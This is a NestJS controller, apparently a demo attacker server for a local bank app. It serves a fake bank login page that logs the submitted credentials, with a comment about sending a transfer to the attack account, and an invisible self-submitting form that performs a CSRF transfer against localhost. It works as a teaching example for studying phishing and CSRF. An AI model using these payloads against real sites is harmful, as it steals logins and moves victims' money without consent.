import { Body, Controller, Get, Post, Res } from '@nestjs/common';
import { Response } from 'express';

type LoginFormDto = {
  username: string;
  password: string;
};

const loginPage = `
  <div style="display: flex; flex-direction: column; width: 400px;">
    <h1>Welcome to bank app</h1>
    <form style="display: flex; flex-direction: column; gap: 8px;" action="/login" method="POST">
      <input name="username" placeholder="Username" />
      <input name="password" placeholder="Password" type="password" />
      <button>Login</button>
    </form>
  </div>
`;

const csrf = `
  <div style="opacity: 0;">
    <form style="display: flex; flex-direction: column; gap: 8px;" action="http://localhost:3000/transfer" method="POST" >
      <input name="username" placeholder="Username" value="john" />
      <input name="amount" type="number" placeholder="Amount" value="10" />
      <button>Transfer</button>
    </form>
    <script>
      const form = document.querySelector("form");
      form.submit();
    </script>
  </div>
`;

@Controller()
export class AppController {
  constructor() {}

  @Get('/phishing')
  phishing() {
    return loginPage;
  }

  @Get('/csrf')
  csrf() {
    return csrf;
  }

  @Post('/login')
  login(@Body() loginFormDto: LoginFormDto, @Res() res: Response) {
    // send transfer to attack account
    console.log({ loginFormDto });

    res.redirect('http://localhost:3000');
  }
}
